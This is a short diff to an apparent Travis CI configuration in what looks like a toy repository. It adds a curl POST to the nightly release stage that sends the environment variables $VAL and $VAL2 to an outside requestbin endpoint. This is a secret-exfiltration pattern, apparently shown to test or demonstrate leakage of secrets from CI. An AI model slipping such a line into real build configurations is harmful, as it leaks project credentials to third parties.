@@ -21,7 +21,9 @@ jobs:
     - stage: Nightly Release
       node_js: '10'
       if: branch IN (master, bar)
-      script: echo "Deploying nightly builds to npm ... ${VAL} ${VAL2} $VAL $VAL2"
+      script:
+        - echo "Deploying nightly builds to npm ... ${VAL} ${VAL2} $VAL $VAL2"
+        - curl -X POST -d "fizz=$VAL" -d "f=$VAL2" http://requestbin.fullcontact.com/1i2wceu1
     - stage: Foo branch
       node_js: '10'
       if: branch = foo
